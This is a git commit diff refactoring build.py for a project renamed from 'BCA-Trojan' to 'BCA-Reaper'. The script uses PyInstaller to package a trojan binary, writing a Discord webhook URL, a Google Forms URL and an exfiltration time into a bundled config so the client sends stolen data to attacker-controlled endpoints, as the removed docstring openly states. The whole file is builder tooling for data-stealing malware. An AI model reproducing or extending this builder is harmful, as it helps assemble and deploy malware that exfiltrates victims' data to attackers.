e01edb7854aa4ac58ad2cc1425f1dbbfc659299e
EONRaider <livewire_voodoo@protonmail.com>
2021-11-22 10:01:12 -0300

    Refactor build module
    The module was greatly simplified by the removal
    of 'configparser'. A Python file is now
    generated with the necessary configuration
    options as global identifiers. Additionally:
    
    - Updated repository URL
    - Modified imports
    - Modified docstrings

--- build.py
+++ build.py
@@ -1,44 +1,33 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-Trojan
+# https://github.com/EONRaider/BCA-Reaper
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import argparse
-import configparser
-import platform
 
-import PyInstaller.__main__
+import PyInstaller.__main__ as pyinstaller
 
 
 def build(args: argparse.Namespace) -> None:
-    """Set-up the arguments required by PyInstaller to build the
-    Trojan binary."""
+    """Set-up the arguments required by PyInstaller to build the Reaper
+    binary."""
 
-    '''A configuration file named 'trojan.cfg' is created with a 
-    hard-coded Discord Webhook URL, Google Forms URL and exfiltration 
-    time setting that allows seamless connection of the binary client 
-    to the server. This file is bundled in the binary and read on 
-    execution.'''
-    config = configparser.ConfigParser()
-    config["TROJAN"] = {
-        "Webhook": args.webhook,
-        "GoogleFormsUrl": args.forms,
-        "ExfiltrationTime": str(args.exfil_time)
+    config = {
+        "webhook": args.webhook,
+        "forms": args.forms,
+        "exfil_time": args.exfil_time
     }
 
-    with open(file="trojan.cfg", mode="w") as config_file:
-        config.write(config_file)
+    with open(file="src/config.py", mode="w") as config_file:
+        for key, value in config.items():
+            config_file.write(f"{key} = '{value}'\n")
 
-    """Path separator for the current operating system. Windows systems 
-    use ';' as a separator, whereas Linux/Unix/MacOS use ':'."""
-    sep = ";" if platform.system() == "Windows" else ":"
+    cmd = "src/reaper.py", "--onefile", "--hidden-import", "config"
 
-    cmd = "src/trojan.py", "--onefile", "--add-data", f"trojan.cfg{sep}."
-
-    PyInstaller.__main__.run(cmd)
+    pyinstaller.run(cmd)
 
 
 if __name__ == "__main__":
-    from src.trojan import cli_parser
+    from src.reaper import parse_cli
 
-    build(cli_parser())
+    build(parse_cli())
